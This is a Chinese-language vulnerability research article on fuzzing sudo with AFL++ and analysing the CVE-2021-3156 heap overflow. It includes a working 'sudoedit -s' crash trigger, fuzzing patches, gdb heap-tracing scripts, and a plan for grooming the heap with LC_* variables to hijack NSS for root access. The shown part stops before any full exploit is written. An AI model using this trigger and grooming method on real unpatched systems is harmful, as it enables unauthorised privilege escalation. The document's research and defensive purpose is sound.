# Fuzz挖掘sudo提权漏洞：一次堆溢出如何逆向分析出提权思路-先知社区

> **来源**: https://xz.aliyun.com/news/17846  
> **文章ID**: 17846

---

# 一，文章概述

堆漏洞在二进制中是非常常见的，之前一直觉得CTF-Pwn的堆题没有任何实战价值，之后开始实战漏洞挖掘后发现大部分挖出来的奔溃样本都是堆内存相关的，这就引发了思考，堆内存触发的奔溃大部分都只能触发一次到底该如何利用呢？但是我觉得这个应该是我自己的知识范围不够，之后去分析了很多其他的堆相关漏洞利用，但往往利用思路都不能够通用，所以出了这篇文章记一次sudo堆溢出如何逆向分析出提权思路，旨在以 sudo 提权漏洞为例，进行从漏洞挖掘到提权思路的全链路分析，为漏洞研究与防护提供更全面的参考。  
本文只在提供一个在实战中堆溢出漏洞的可利用思路，网上的其他文章都只是零散的将 POC 进行分析，并没有解析出其中可以通用的堆操作手法，比如利用`setlocale`构造堆风水等等。分析和编写过程中可能有疏漏，如有问题请各位读者不吝指正

一，文章概述  
二，sudo调研与Fuzz方式考察  
三，修改sudo源码与进行AFL++模糊测试:主要是学习命令行参数fuzz  
四，收集奔溃样本与分析奔溃原因：使用pwngdb动态调试定位堆溢出漏洞成因  
五，奔溃样本逆向分析进行可利用性评估：通过分析整个程序的堆操作，思考提权和堆构造思路  
六，劫持NSS服务用户对象实现提权原理：有思路后具体分析提权原理  
七，解析setlocale能够进行堆布局原理：整理调试弄清setlocale的堆构造规则  
八，基于已有的思路构造可以利用的POC

CTF-Pwn的堆题和实战堆漏洞的相关联系：Pwn的堆题提供了，操控堆结构的明确接口增删改查都有，但是在实际漏洞利用的时候是不会提供这些接口的，但是程序中必然会有堆操作，需要了解整个Linux机制，和逆向分析程序中的每一个堆操作，来筛选出可以控制的增删改查的堆操作！进而提升堆漏洞的可用性和实际价值！

# 二，sudo调研与 Fuzz方式考察

## 了解什么是sudo

sudo（superuser do）是 Linux 和 Unix 系统中常用的命令，可以让普通用户以root权限执行命令 。它通过配置文件 /etc/sudoers 来管理用户权限。普通用户需要安装软件包，就可以通过 sudo 命令以 root 权限调用apt，无需切换到 root 账户，非常便捷。  
![](images/20250429113231-954f8986-24aa-1.png)

## 考察sudo的工作原理与常规Fuzz的不兼容性

当用户执行 sudo 命令时，会检查用户是否在 sudoers 文件中有相应的权限配置。有权限，sudo 会提示用户输入自己的密码，验证通过后，sudo 会切换到root身份，执行后续命令。执行完毕后，再恢复到原用户身份。

而常规的Fuzz测试是通过向程序输入大量随机或变异数据，检测程序是否会出现崩溃、内存泄漏等异常情况。一般的输入方式是通过stdin或者文件输入，但是sudo的使用方式大部分是通过命令行参数实现的，且sudo的常规使用逻辑也会和Fuzz 存在诸多冲突之处：  
1.**密码输入问题**：sudo 执行需要输入密码，在自动化的 Fuzz 测试过程中，若等待密码输入，程序会挂起，导致测试中断。  
2.**命令行参数处理**：向 sudo 导入模糊测试数据时，需要考虑如何正确传递参数，避免因参数格式错误导致 sudo 无法执行或执行错误。  
3.**参数控制难题**：sudo 测试过程中的第一个参数（通常是要执行的命令）需要精准控制，若参数错误，可能无法触发有效测试或引发系统错误。  
4.**程序内部实现复杂性**：sudo 内部不仅实现了 sudo 功能，sudoedit 工具的代码实现也在 sudo 程序内部，通过软链接替换启动程序名称来区分功能。因此，进行 Fuzz 测试时，必须指定正确的启动程序名称，才能对 sudo 及其相关功能进行全面检测。

## AFL++对命令行参数Fuzz的拓展

一、argv\_fuzz 功能概述  
传统的 AFL 工具支持对文件输入或标准输入进行模糊测试，而 AFL++ 的argv\_fuzz工具，位于官方 GitHub 仓库的utils/argv\_fuzzing目录下[AFLplusplus/utils/argv\_fuzzing at stable · AFLplusplus/AFLplusplus (github.com)](https://github.com/AFLplusplus/AFLplusplus/tree/stable/utils/argv_fuzzing)，专注于对通过命令行界面传递给程序的参数进行模糊测试。这意味着它能够模拟各种不同的命令行参数组合，帮助我们发现程序在处理参数过程中可能存在的漏洞.  
在实际应用中，例如在对 Curl 程序的审核中，通过对argv的模糊测试，成功挖掘出了程序中的重大安全隐患 ，案例：[Curl 审核：一句玩笑话引出的重大发现\_测试\_参数\_argv](https://www.sohu.com/a/647954498_115128)

当我们拥有目标程序的源代码时，可以借助argv-fuzz-inl.h头文件中的宏，改变程序的行为，使其从标准输入构建argv，进而实现对命令行参数的模糊测试。  
**准备工作**：首先，在源文件中包含argv-fuzz-inl.h头文件，即添加#include "argv-fuzz-inl.h"语句。接着，找到程序中负责解析参数的主函数，通常形式为int main(int argc, char \*\*argv) 。

**宏的使用**：在主函数开头附近，根据需求选择合适的宏来初始化argv。若无需保留`argv[0]`（程序名称），可使用AFL\_INIT\_ARGV();；若希望保留`argv[0]`，则使用AFL\_INIT\_SET0("prog\_name");，其中"prog\_name"需替换为实际的程序名称。具体使用示例可参考argv\_fuzz\_demo.c文件（[argv\_fuzz\_demo.c](https://github.com/AFLplusplus/AFLplusplus/blob/stable/utils/argv_fuzzing/argv_fuzz_demo.c)）。

```
// 初始化argv，保留argv[0]​
#define AFL_INIT_SET0(_p)        \​
  do {                           \​
                                 \​
    argv = afl_init_argv(&argc); \​
    argv[0] = (_p);              \​
    if (!argc) argc = 1;         \​
                                 \​
  } while (0)
```

# 三，修改sudo源码与进行AFL++模糊测试

## 修改sudo源码与Fuzz测试准备

在进行针对 sudo 的 Fuzz 测试前，对 sudo 源码的修改以及相关准备工作起着关键作用。能让后续测试流程更为顺畅地开展，另一方面，合理地准备如控制测试过程中的参数、准备模糊测试种子样本以及搭建好合适的测试环境（像 Docker 容器环境、配置编译开启 Asan 模式等），都是为了能更全面、高效且准确地对 sudo 及其相关功能进行模糊测试，从而提高目标程序的覆盖率以及获取更多有价值的测试样本。

### 解决 sudo 需要输入密码，避免程序挂起

为解决 sudo 密码输入导致程序挂起问题，直接将sudo的密码验证函数patch掉，想要利用sudo的漏洞肯定是要站在无密码的角度来的，不然漏洞价值不高，将verify\_user的返回值为0，表示密码错误！

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5p1/plugins/sudoers/auth/sudo_auth.c:243

/*
 * Verify the specified user.
 * Returns true if verified, false if not or -1 on error.
 */
int
verify_user(struct passwd *pw, char *prompt, int validated,
    struct sudo_conv_callback *callback)
{
    return 0;  //直接返回避免密码验证导致的挂起操作
    unsigned int ntries;
    int ret, status, success = AUTH_FAILURE;
    sudo_auth *auth;
    sigset_t mask, omask;
    struct sigaction sa, saved_sigtstp;
    debug_decl(verify_user, SUDOERS_DEBUG_AUTH);

    /* Make sure we have at least one auth method. */
    if (auth_switch[0].name == NULL) {
    audit_failure(NewArgv, N_("no authentication methods"));
        log_warningx(SLOG_SEND_MAIL,
        N_("There are no authentication methods compiled into sudo!  "
        "If you want to turn off authentication, use the "
        "--disable-authentication configure option."));
    debug_return_int(-1);
    }

```

默认返回0确保密码错误！

### 如何控制 sudo 测试过程中的第一个参数

通过编写测试用例，明确规定 sudo 测试过程中第一个参数的取值范围和格式。在 Fuzz 测试工具中设置参数生成规则，确保生成的参数符合要求。可以结合正则表达式等方式，对参数进行合法性校验，保证测试的有效性。

添加头文件:#include "/AFLplusplus/utils/argv\_fuzzing/argv-fuzz-inl.h"

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5p1/src/sudo.c:150
...
int
main(int argc, char *argv[], char *envp[])
{
    AFL_INIT_ARGV();
    //AFL_INIT_SET0("sudoedit")
    int nargc, status = 0;
...
```

在进行 Fuzz 测试前，需要根据测试目标，明确指定启动程序名称。可以在测试脚本中设置变量，根据不同的测试场景切换启动程序名称，如sudo或sudoedit，从而实现对 sudo 及其相关功能的全面测试。

AFL\_INIT\_ARGV和AFL\_INIT\_SET0为了限制sudo的参数来触发漏洞!  
AFL++生成的数据将输出生成到文件或stdout中，但是需要模糊测试命令行参数。需要自行修补sudo源码，使用这两个宏都可以忽略实际的argv并将其改为从stdin。

### 验证fuzz过程中命令行参数是否被修改的小技巧

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5p1/lib/util/progname.c:83
void
initprogname2(const char *name, const char * const * allowed)
{
    int i;
# ifdef HAVE___PROGNAME
    extern const char *__progname;

    if (__progname != NULL && *__progname != '\0')
    progname = __progname;
    else
...

//改为
void
initprogname2(const char *name, const char * const * allowed)
{
    int i;
# if 0   //直接改为0避免出现第一个sudo参数被修改的情况,让argv可控
    extern const char *__progname;

    if (__progname != NULL && *__progname != '\0')
    progname = __progname;
    else
...
```

该函数会将输入的程序如果为sudoedit的话，在该函数会被修改为sudo,所以也需要patch掉！  
小技巧,在修改argv的参数后,直接在程序结束的时候打印argv的参数查看是否被修改过！

### 准备模糊测试种子样本

准备测试用例种子：

```
echo -ne 'sudo\0ls\0\0' > case1 
echo -ne 'sudoedit\0test\0\0' > case2 
echo -ne 'sudoedit\0-s\0aaaaaaa\0\0' > case3
```

在源码中添加的AFL\_INIT\_ARGV或者AFL\_INIT\_SET0这些宏，会将命令行参数根据'\0'拆分为程序实际的argv！

```
sudo -s  \
sudoeit ls
...
```

## AFL++并行fuzz配置

Docker 容器环境搭建:

```
docker run --ipc=host  -v ~/FuzzCVEInit/sudo_fuzz:/tmp --name sudo_fuzz -it aflplusplus/aflplusplus /bin/bash
```

调试编译目标程序:

```
wget https://www.sudo.ws/dist/sudo-1.9.5p1.tar.gz
tar -xvzf  sudo-1.9.5p1.tar.gz
```

首次配置编译开启Asan模式：

```
#修改源码后进行编译目标
CFLAGS="-fsanitize=address,undefined -g" LDFLAGS="-fsanitize=address,undefined -g" CC=afl-clang-fast ./configure --disable-shared --prefix=/tmp/sudo_install > /dev/null
AFL_USE_ASAN=1 make -j > /dev/null
make install >/dev/null
```

可以使用 tmux 创建多个 AFL 实例进行并行测试，通过配置并发 fuzz 执行，提高目标程序的覆盖率和获取更多的测试样本。

```
tmux new -s m
afl-fuzz -i input/ -o output -M m -- ./sudo_install/bin/sudo
tmux new -s s0
afl-fuzz -i input/ -o output -S s0 -- ./sudo_install/bin/sudo
afl-fuzz -i input/ -o output -S s1 -- ./sudo_install/bin/sudo
afl-fuzz -i input/ -o output -S s2 -- ./sudo_install/bin/sudo
```

图示：  
![](images/20250429113233-96642807-24aa-1.png)

# 四，收集奔溃样本与分析奔溃原因

该样本影响了`sudo`工具的`sudoers.c`文件中的`set_cmnd`函数，详细的可以查看Asan报告，触发漏洞:

```
nrin@DESKTOP-N9MLNLD:/root/FuzzCVEInit/sudo_fuzz$ ./sudodebug/bin/sudoedit -s '\' 111111111111111111111111111111111
```

![](images/20250429113234-9719caec-24aa-1.png)

向地址 `0x607000001487` 写入了超出范围的1个字节数据，该地址是堆内存分配的尾部，所以是 heap overflow

```
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x607000001487 WRITE of size 1
```

溢出发生的位置，plugins/sudoers/sudoers.c的868行的set\_cmnd函数！  
发生溢出的堆块在 `sudoers.c` 的 **第854行**，由 `set_cmnd` 调用 `malloc` 申请，溢出发生在 **第868行**，所以是在同一个函数内，申请了内存后向该堆块写入过量的数据导致溢出！

开始基于Asan报告进行漏洞原因探究！

```
/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.8.31/sudo-1.8.31p2/plugins/sudoers/sudoers.c:868
```

主要的函数链：

```
set_cmnd /home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.8.31/sudo-1.8.31p2/plugins/sudoers/./sudoers.c:868:10
sudoers_policy_main /home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.8.31/sudo-1.8.31p2/plugins/sudoers/./sudoers.c:306:19
sudoers_policy_check /home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.8.31/sudo-1.8.31p2/plugins/sudoers/./policy.c:872:11
policy_check /home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.8.31/sudo-1.8.31p2/src/./sudo.c:1138:11
main
__libc_start_main
_start
```

## 从main分析输入数据的流动变化

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5/sudo-1.9.5p1/src/sudo.c:216
int
main(int argc, char *argv[], char *envp[])
{
...
    const char * const allowed_prognames[] = { "sudo", "sudoedit", NULL }; // 允许的程序名称列表
 ....
    /* 解析命令行参数，关键函数解析-s选项 */
    sudo_mode = parse_args(argc, argv, &submit_optind, &nargc, &nargv,&settings, &env_add);
    sudo_debug_printf(SUDO_DEBUG_DEBUG, "sudo_mode %d", sudo_mode); // 调试输出sudo模式
...

    switch (sudo_mode & MODE_MASK) {  // 根据sudo模式处理不同情况
...
    case MODE_EDIT:  // 编辑模式
    case MODE_RUN:   // 运行模式
        // 执行策略检查，传入参数和环境变量，获取命令信息、输出参数和用户环境
        policy_check(nargc, nargv, env_add, &command_info, &argv_out,&user_env_out);
...
```

从`main`函数开始分析输入流的处理，首先调用`parse_args`函数解析输入的参数，`-s`选项会被剔除，剩余的参数传递到后续函数中。  
同时`-s`选项也会设置`sudo_mode`为`MODE_EDIT`，引导程序进入`set_cmnd`函数导致堆溢出。

可以简单调试一下，原本为-s选项在argv中：  
![](images/20250429113235-97c11f39-24aa-1.png)  
经过parse\_args处理后，在后续流程赋值给NewArgv，参数中-s消失了  
![](images/20250429113236-9871640f-24aa-1.png)

剩下的步骤就是简单的源码跟踪到关键函数了！

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5/sudo-1.9.5p1/src/sudo.c:1171
static int
policy_check(struct plugin_container *plugin, int argc, char * const argv[],
    char *env_add[], char **command_info[], char **argv_out[],
    char **user_env_out[])
{
    ··· ···
    ··· ···
    ok = policy_plugin.u.policy->check_policy(argc, argv, env_add,command_info, argv_out, user_env_out, &errstr);
    ···
}
```

无法直接通过源码查看调用的函数，使用gdb调试识别出函数名称！  
![](images/20250429113238-993910e0-24aa-1.png)

```
pwndbg> p policy_plugin.u.policy->check_policy
$4 = (int (*)(int, char * const *, char **, char ***, char ***, char ***,
    const char **)) 0x55e56021ce70 <sudoers_policy_check>
```

继续向下跟进：

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5/sudo-1.9.5p1/plugins/sudoers/policy.c:1013
static int
sudoers_policy_check(int argc, char * const argv[], char *env_add[],
    char **command_infop[], char **argv_out[], char **user_env_out[],
    const char **errstr)
{
    struct sudoers_exec_args exec_args;
    int ret;
...
    ret = sudoers_policy_main(argc, argv, 0, env_add, false, &exec_args);//调用sudoers策略主函数
...
}
```

然后调用了sudoers.c 中的sudoers\_policy\_main 函数。

```
#/home/ub20/FuzzCVEInit/sudo_fuzz/sudo-1.9.5/sudo-1.9.5p1/plugins/sudoers/sudoers.c:332
int
sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],
    void *closure)
{
    ··· ···
    NewArgv[0] = user_cmnd;
    NewArgv[1] = NULL;
    } else {
    /* Must leave an extra slot before NewArgv for bash's --login */
    NewArgc = argc;
    NewArgv = reallocarray(NULL, NewArgc + 2, sizeof(char *));
...
    memcpy(NewArgv, argv, argc * sizeof(char *));
    NewArgv[NewArgc] = NULL;
    }
    ··· ···
    cmnd_status = set_cmnd();//追踪到溢出漏洞最后出现的位置
    ··· ···
    ··· ···
    ··· ···
}
```

这里的NewArgc 和 NewArgv这两个变量提之前提到过，后续在漏洞触发的地方会用到，这里是NewArgc 和 NewArgv 在sudoers\_policy\_main函数初始化。

## 分析set\_cmnd函数，定位奔溃原因

动态调试定位到楼的函数位置:

```
pwndbg> file ./sudoedit
Reading symbols from ./sudoedit...
pwndbg> set args -s \ 111111111111111111111111111111111111111111111111111111111111111111111111111111111
pwndbg> b set_cmnd
pwndbg> start
```

成功打下断点来到目标位置！  
![](images/20250429113240-9a71f3ee-24aa-1.png)

接下来就是分析漏洞成因的关键代码段了！

```
/*
 * 填充 user_cmnd、user_args、user_base 和 user_stat 变量，
 * 并应用任何特定于命令的默认条目。
 */
static int
set_cmnd(void)
{
    struct sudo_nss *nss;  // 定义sudo命名空间结构体指针
...
        //这里的NewArgv是去除了-s和NewArgv[0] sudoedit,所以调试的时候是0x54
        for (size = 0, av = NewArgv + 1; *av; av++)
            size += strlen(*av) + 1;
        if (size == 0 || (user_args = malloc(size)) == NULL) { //申请堆块的大小
....
        for (to = user_args, av = NewArgv + 1; (from = *av); av++) {  // 处理每个参数
            while (*from) {  // 处理每个字符
            if (from[0] == '\' && !isspace((unsigned char)from[1]))  // 如果是转义字符且后跟非空格
                from++;  // 跳过转义字符
            *to++ = *from++;  // 复制字符
            }
            *to++ = ' ';  // 添加空格分隔符
        }
        *--to = '\0';  // 字符串结尾
...
}
```

这里就是漏洞奔溃的关键位置了，动调查看下NewArgv的内容来确定申请堆块的大小，发现是0x54：  
![](images/20250429113236-9871640f-24aa-1.png)

溢出发生在`*to++ = *from++`拷贝的时候，根据代码可以看出，堆溢出发生在向堆中拷贝时，这段代码原来是将NewArgv中的所有参数都拷贝到堆中，按照空格分割，遇到`\+非空格类字符` 则只拷贝该字符  
但是这个校验逻辑没有考虑充分，!isspace函数只是非空格类字符，但是们没有考虑到`\x00`不属于空格类字符，可以在while循环中发现如果遍历到`\x00`循环就会结束，但是`NewArgv[0]`通过`from[0] == '\\' && !isspace((unsigned char)from[1])`判断后两次from++导致,from指向了`NewArgv[1]`的内容从而出现了非预期行为，即继续拷贝后续内容，也就是拷贝我们输入的’11111111111111...‘，当拷贝到’11111111111111...‘后面的\x00，就av++又会将`NewArgv[1]`再向堆写一次，导致堆溢出！  
可以动态调试一下：  
![](images/20250429113242-9c008be2-24aa-1.png)  
to整个变量申请的堆块大小是0x54,但是由于参数长度识别失败,导致被放入堆块的长度会到达`"\x00"+"1"*81"+"1"*81"`的长度导致程序出现溢出漏洞  
也就说,程序可以溢出的大小和内容就是"`\`" 参数后面接的字符串长度!  
![](images/20250429113243-9c7ec31e-24aa-1.png)  
成功向堆块溢出一个字节的内容!并且修改了下一个堆块的内容!  
![](images/20250429113244-9cf9e7d1-24aa-1.png)  
由于堆块结构被破坏了,再次运行,就会出现如下报错,这个就是漏洞的成因分析了!:  
![](images/20250429113245-9d8af0a4-24aa-1.png)

# 五，奔溃样本逆向分析进行可利用性评估

分析完奔溃样本可以知道漏洞发生在sudo的堆空间上，想实现这个漏洞的利用毫无疑问就是通过该漏洞让普通用户在无密码的情况下提权，那么利用手法就只能是覆盖堆上数据来达到提权目的，所以要先收集sudo历史漏洞和提权手法，以及搜集sudo堆块结构控制手法，通过这些信息来构造利用手法从而来达到提权目的！

## sudo历史提权漏洞汇总表

|  |  |  |  |  |
| --- | --- | --- | --- | --- |
| CVE编号 | 影响版本 | 漏洞描述 | 修复建议 | 参考链接 |
| **CVE-2019-14287** | Sudo <1.8.28 | **权限绕过漏洞**：当用户通过`sudo -u#-1`或`sudo -u#4294967295`执行命令时，系统错误地将UID解析为0（root）。需满足特定配置条件（如允许用户以非root身份执行命令）。 | 升级至1.8.28或更高版本，检查`/etc/sudoers`配置安全性。 | [Mitre CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)  ​[Qualys分析](https://blog.qualys.com/) |
| **CVE-2021-3156** | Sudo 1.8.2–1.8.31p2  Sudo 1.9.0–1.9.5p1 | **堆缓冲区溢出漏洞**：攻击者通过`sudoedit -s`命令及以反斜杠结尾的参数触发溢出，无需密码即可提权至root。漏洞存在长达10年，影响默认配置的系统。 | 升级至1.9.5p2或更高版本，临时禁用`sudoedit`。 | [Red Hat公告](https://access.redhat.com/security/cve/CVE-2021-3156)   [Qualys技术分析](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) |
| **CVE-2023-22809** | Sudo 1.8.0–1.9.12p1 | **任意文件读写漏洞**：通过环境变量`EDITOR`或`SUDO_EDITOR`注入`--`参数，攻击者可绕过路径限制，读写任意文件（如`/etc/passwd`或`/etc/shadow`），导致权限提升 | 升级至1.9.12p2或更高版本，限制用户使用`sudoedit`的权限。 | [Mitre CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809)  ​[GitHub PoC](https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc) |
|  |  |  |  |  |

想要全面评估该漏洞的可利用性，需要先了解`sudo`历史上的漏洞和攻击方法。

## sudo的堆使用情况跟踪

该漏洞发生在堆上，那么提权的方法必然和堆操作相关，和堆操作不相干的函数就可以直接跳过，降低漏洞分析成本，为了理解与堆相关的执行流程，我编写了 gdb 脚本追踪sudo执行过程中 malloc、realloc、calloc 和 free 函数的堆使用情况。编写一个普通的gdb脚本来观察该漏洞在奔溃前的堆操作！

```
# heap‑trace.gdb

# 1) 开日志并关分页
set logging file heap.log
set logging redirect on
set logging on 
set pagination off

# 2) 分别给 malloc/calloc/realloc/free 下断
break malloc
break calloc
break realloc
break free

# 3) 给每个断点都绑自动 backtrace 并继续的命令块
# malloc
commands 1
  silent
  printf ">>> malloc(%zu)
", $rdi
  backtrace
  continue
end

# calloc
commands 2
  silent
  printf ">>> calloc(%zu, %zu)
", $rdi, $rsi
  backtrace
  continue
end

# realloc
commands 3
  silent
  printf ">>> realloc(%p, %zu)
", (void*)$rdi, $rsi
  backtrace
  continue
end

# free
commands 4
  silent
  printf ">>> free(%p)
", (void*)$rdi
  backtrace
  continue
end
```

得出一系列的操作函数的调用栈避免过多的函数分析减少逆向分析的成本！

```
#调试时候用到测试参数
set args -s \ 111111111111111111111111111111111111111111111111111111111111111111111111111111111 #触发漏洞
set environment LC_IDENTIFICATION=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  #设置环境变量
set environment LC_NAME=xxxxxxxxxxxxxxxxxxxxx
```

![](images/20250429113246-9e173a17-24aa-1.png)  
得到log文件后就可以通过一系列的脚本进行处理得到我们需要的数据：  
主要使用的工具就是GPT生成筛选脚本再使用dot生成流程图就可以了！  
下载调用链生成图片工具:

```
sudo apt update
sudo apt install graphviz
```

将python赛选出来的数据生成callgraph.dot

```
 dot -Tpng callgraph.dot -o callgraph.png
```

可以收集到下面函数：  
![](images/20250429113247-9ee22c24-24aa-1.png)  
发现被main函数调用过且存在堆操作的函数就成功筛选出来了，直接将分析成本指数级别的降低了，只需要分析这些函数是否可以控制其堆结构就可以判断出这个堆溢出漏洞的实际价值了！  
结合IDA的分析出函数的调用顺序：  
![](images/20250429113248-9f6e0781-24aa-1.png)  
整理出函数调用顺序后就可以具体整理每个函数的作用了！继续详细跟进每个函数！

结合AI加上源码阅读分析出的主程序流程 (main())，分析其中可能的提权手法：

```
main()
|- _GI_setlocale("")                     // 初始化本地化设置（空字符串表示默认环境）
|- __tzset()                           // 设置时区信息
|- sudo_conf_read_v1(CONF_DEBUG)     // 读取调试配置（第一阶段）
|  |- setlocale("C")                 // 临时切换为C标准本地化（避免编码问题）
|  |- read /etc/sudo.conf            // 解析主配置文件 `/etc/sudo.conf`
|  |- setlocale(prev_locale)         // 恢复之前的本地化设置
|- sudo_conf_read_v1(CONF_ALL)       // 读取全部配置（同上，但包含所有配置项）
|- get_user_info()                   // 获取用户信息
|  |- getpwuid                       // 通过UID查询用户信息（如用户名、主目录）
|  |   |- parse /etc/nsswitch.conf // 解析NSS配置，创建 `service_user` 结构体（用于后续身份验证）
|    // 攻击者可篡改NSS配置文件，以伪造身份或绕过认证
|- parse_args()                      // 解析命令行参数
|- sudo_load_plugins()               // 加载插件模块
|  |- load sudoers.so                // 加载核心插件 `sudoers.so`
|  |- register env hooks             // 注册环境变量钩子（用于动态环境控制）
|    // 攻击者可通过篡改环境变量或插件配置来执行恶意操作
|- policy_open()                     // 初始化策略插件
|  |- format_plugin_settings()       // 格式化插件配置
|  |  |- initialize network_addrs    // 初始化网络地址等设置（涉及多次内存分配）
|    // 如果内存分配不当，可能导致缓冲区溢出或内存泄漏等漏洞
|  |- sudoers_policy_init()          // 初始化 `sudoers` 策略模块
|     |- init_defaults()             // 设置默认参数
|     |  |- strdup(def_timestampdir) // 复制字符串（如时间戳目录路径）
|     |  // 如果路径处理不当，可能导致路径注入攻击
|     |  |- dcgettext()              // 本地化字符串处理（多语言支持）
|     |  |- init_envtables()            // 初始化环境变量表（小内存分配频繁）
|     |- init_vars()                 // 初始化内部变量
|     |- sudo_file_parse()           // 解析 `/etc/sudoers` 文件（核心权限规则）
|       // 攻击者可以通过篡改sudoers文件或恶意配置提升权限
|- policy_check()                    // 执行权限检查
|   |- sudoers_policy_main()          // 主策略逻辑（见下方详细流程）
|	|   |- set_cmd()                      // 设置待执行的命令参数（此处存在已知漏洞）
        // 该函数可能存在命令注入漏洞，攻击者可通过恶意参数绕过权限控制
```

总结sudoers\_policy\_main() 详细流程，分析其中可能的提权手法

```
sudoers_policy_main()
- set_cmnd()                         // 设置命令参数（此处存在已知漏洞）
    // 如果该函数未正确验证命令参数，可能导致命令注入或权限提升
- _GI_setlocale("C")                     // 临时切换为C本地化（确保文件解析一致性）
- sudo_file_lookup()                 // 从已解析的 `/etc/sudoers` 中查询规则
  - nss *                            // 可能调用NSS（Name Service Switch）模块
    - nss_load_library()             // 动态加载NSS库（如LDAP/SSSD集成）
    // 攻击者可通过篡改NSS库或插件来劫持身份验证
- setlocale(user_locale)             // 恢复用户原始本地化设置
- check_user()                       // 验证用户权限
  - check_user_interactive()         // 交互式验证（需用户输入）
    - create timestamp file          // 创建时间戳文件（记录认证时间）
    - ask for password               // 请求密码（失败则直接退出）
    // 如果时间戳文件或密码提示没有正确保护，可能导致信息泄露或重放攻击
- find_editor()                      // 查找编辑器（仅认证成功后执行）
  - call sudoer_hook_env("SUDO_EDITOR") // 通过钩子设置 `SUDO_EDITOR` 环境变量
    // 如果环境变量可以被攻击者修改，可能导致攻击者执行恶意编辑器或代码
```

## 观察sudo在崩溃前的堆操作思考提权手法

提权的关键在于修改堆上数据，比如堆溢出覆盖堆中的虚函数表，函数指针、结构体指针等关键数据。  
然后分析溢出操作完成后再到密码验证之前,有哪些函数使用了漏洞函数之前已经存在的堆块,并且分析这些堆块被覆盖后是否可以达到提权的目的!  
结合前面动态调试和静态分析收集到的信息就可以开始确定可能可以覆盖的提权对象了！下面只是分析出了部分，应该还有更多的提权思路！

### **NSS服务用户对象**(NSS 劫持)

在`get_user_info()`中，`getpwuid()`函数通过UID查询用户信息，`parse /etc/nsswitch.conf`则用来解析NSS配置。`service_user`对象应该是与NSS（Name Service Switch）模块相关的，用于认证用户身份。在漏洞利用中，攻击者可能通过篡改或操纵这个对象来伪造身份或绕过认证。  
 ![](images/20250429113249-9fffe683-24aa-1.png)

### **Def\_timestampdir 路径**(时间戳竞态)

在`sudoers_policy_init()`函数中，有`strdup(def_timestampdir)`调用，复制时间戳目录路径。如果路径处理不当，可能会导致路径的注入或不安全的文件操作。在漏洞利用场景下，攻击者可能利用这个路径来操控权限或绕过某些安全检查。  
![](images/20250429113250-a060d5ee-24aa-1.png)

### **Userspecs 对象**(UserSpec 结构覆盖)

在`sudo_file_parse()`中，`/etc/sudoers`文件被解析，其中定义了`sudoers`策略和用户权限。如果`userspecs`对象在解析时没有进行充分的验证或边界检查，可能会被篡改以获得不正当的权限。攻击者可以操纵`sudoers`文件或相关数据结构来提升权限。  
![](images/20250429113250-a0b3084c-24aa-1.png)

这些都可以实现提权具体的利用POC可以看这里：[worawit/CVE-2021-3156: Sudo Baron Samedit Exploit](https://github.com/worawit/CVE-2021-3156)

汇总评估后发现NSS 劫持，该提权思路的实现可用性最高！  
![](images/20250429113251-a1434dcf-24aa-1.png)  
该漏洞主要是劫持nss\_load\_library函数的指针从而进行提权，发现NSS服务在堆块溢出前进行了堆操作并初始化，在发生堆块溢出后，NSS服务再次被使用，又进行了堆操作读取，完美的契合了劫持NSS服务的提权思路！

## 观察sudo在崩溃前的堆操作思考堆块结构控制手法

CTF-Pwn的堆题和实战堆漏洞的相关联系：Pwn的堆题提供了，操控堆结构的明确接口增删改查都有，但是在实际漏洞利用的时候是不会提供这些接口的，但是程序中必然会有堆操作，需要了解整个Linux机制，和逆向分析程序中的每一个堆操作，来筛选出可以控制的增删改查的堆操作！进而提升堆漏洞的可用性和实际价值！  
首先从上面筛选出大量进行堆操作的函数进行分析,整理并且归纳一下,这些堆操作,哪些是可以控制的,哪些是不可以控制的,可以控制的可以进行哪些操作!

### find\_editor() 函数 (涉及 SUDO\_EDITOR, VISUAL, EDITOR 环境变量)

在`sudoers_policy_main() -> find_editor()`函数路径中，函数中使用 `strdup` 复制用户设置的编辑器路径。可以通过设置 `SUDO_EDITOR`、`VISUAL` 或 `EDITOR` 环境变量为任意长度的字符串，触发大块堆分配。

### init\_defaults() 函数 (涉及 SUDO\_TIMESTAMP\_DIR 环境变量)

在`policy_open() -> sudoers_policy_init() -> init_defaults()`函数路径中，函数中从 `SUDO_TIMESTAMP_DIR` 复制时间戳目录路径。设置 `SUDO_TIMESTAMP_DIR` 环境变量控制 `strdup` 分配的长度。

### `setlocale` 函数（通过 `LC_*`控制）

在`_GI_setlocale()`函数中,glibc 的 `_nl_find_locale` 函数会根据环境变量动态加载区域设置数据，触发多次 malloc 和 free，可以通过环境变量 `LC_*`（如 `LC_ALL`, `LC_IDENTIFICATION`）控制内存分配大小和次数。

### `tzset` 函数（通过 `TZ` 环境变量控制）

在`__tzset()`函数中,tzset 解析时区信息时，若 TZ 为空或格式特殊（如 :），会跳过复杂时区文件解析，仅分配少量内存 。设置 `TZ=:` 可减少堆使用量，使内存布局更可预测。

上面这些函数是经过源码分析后汇总出来的可能能够进行堆结构控制的相关函数，其中`find_editor()`函数是在堆溢出之后调用几乎无可利用价值，`tzset`函数的价值也不高，只能减少堆块，`init_defaults()`该函数操作大概率可行，`setlocale`最合适因为他可以释放指定大小的堆块在堆回收站中，并且可以构造堆块释放的顺序，所以使用`setlocale`进行堆块布局最好用！  
![](images/20250429113253-a235e945-24aa-1.png)

